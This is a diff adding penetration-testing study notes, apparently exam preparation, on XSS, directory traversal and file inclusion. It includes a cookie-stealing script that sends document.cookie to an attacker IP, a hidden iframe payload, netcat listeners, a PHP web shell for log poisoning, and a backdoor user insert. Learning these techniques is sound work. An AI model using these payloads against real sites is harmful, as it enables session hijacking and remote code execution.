@@ -55,3 +55,63 @@ Example of Burp and phpMyAdmin. Even though you can't use Burp in the exam...
 9. Run SQL query:
    * `select * from webappdb.users;`
    * `insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");`
+
+# Cross-Site Scripting (XSS)
+
+Look for entry points (search fields, comment fields, logins etc) and enter special characters to see if they are encoded, for example `< > ' " { } ;`. If they are not encoded or removed, the site may be vulnerable to XSS to introduce code.
+
+If the entered text is printed back to the page, check with inspector if it is encoded in any way.
+
+Content can be injected for client-side attacks and redirect the browser. A stealth method is using an iframe to introduce the payload. Note the 0 heigh and width:
+`<iframe src=http://192.168.0.163/report height=”0” width=”0”></iframe>`. Submit and on target:  
+`sudo nc -nvlp 80`
+
+Note we can see the User-Agent header and other information on the victim's browser to help conduct further attacks. XSS can be used to steal cookies and session information from applications with insecure session management. Two important flags are:
+* Secure - the browser only sends the cookie over encrypted connections such as HTTPS, preventing capture of the cookie.
+* HttpOnly 0 denies JavaScript access to the cookie. If set, we cannot use an XSS payload to steal the cookie.
+* Other issues include browsers prevent cookies set by one domain from being sent to another. This can be relaxed for subdomains in the set-cookie directive via the domain and path flags. A workaround if JavaScript can bhe used is to use the value as part of a link and send the link, which could be used to deconstruct the cookie.
+
+Cookie stealing XSS payload:  
+`<script>new Image().src="http://192.168.119.231/cool.jpg?output="+document.cookie;</script>`  
+`sudo nc -nvlp 80`
+
+When someone visits the page we can obtain their cookie. Use Cookie-Editor by Moutsachauve on FF to impersonate. Practice with Kali Beef.
+
+# Directory Traversal Vulnerabilities
+
+Look in the URL query strings and bodies for evidence the values appear as file references. For example: `/menu,php?file=current_menu.php`.  
+Try swapping out the file for something else: `menu.php?file=c:\windows\system32\drivers\etc\hosts`.  
+An important distrinction is whether files can be read both in and outside the web root directory.
+
+# File Inclusion Vulnerabilities
+
+Similar to the directory traversal, we are looking for parameters that can be manipulated. In file inclusion vulnerabilities, we are looking to execute the contents of the file in the application. This can also include trying a remote URL as well as local files. 
+
+The server needs to include or execute the file we are trying to include, not just display it's contents. One way to inject code onto the server is through log file poisoning. If application servers are logging all URLs requested, we can submit a request including PHP code. Once it is logged, we can use the log file in the LFI payload.
+
+Connect to the target server: `nc -nv <ip> 80`. Once connected send:
+`<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`  
+This will cause the PHP application to execute:
+`<?php echo shell_exec($_GET[‘cmd’]);?> `
+
+With this payload now in the log file, we can attempt local file inclusion (LFI) execution:  
+`http://192.168.231.10/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
